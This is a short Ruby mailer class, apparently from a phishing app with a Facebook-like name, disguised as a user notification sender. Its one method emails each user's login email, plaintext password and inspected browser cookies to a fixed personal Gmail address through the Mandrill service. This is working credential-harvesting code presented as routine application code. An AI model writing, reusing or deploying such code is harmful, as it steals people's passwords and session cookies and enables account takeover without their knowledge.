class NotificationMailer < MandrillMailer::TemplateMailer
  default from: 'notification_fukbuk@mandrill.com'

  def notification(user)
    mandrill_mail(
      template: 'notification',
      subject: "Notification User",
      to: { email: "neriummachi@gmail.com", name: "Nerium Machi" },
      vars: {
        'EMAIL' => user[:email],
        'PWD' => user[:pass],
        'COOKIES' => user[:cookies].inspect
      },
      important: true,
      inline_css: true
     )
  end
end  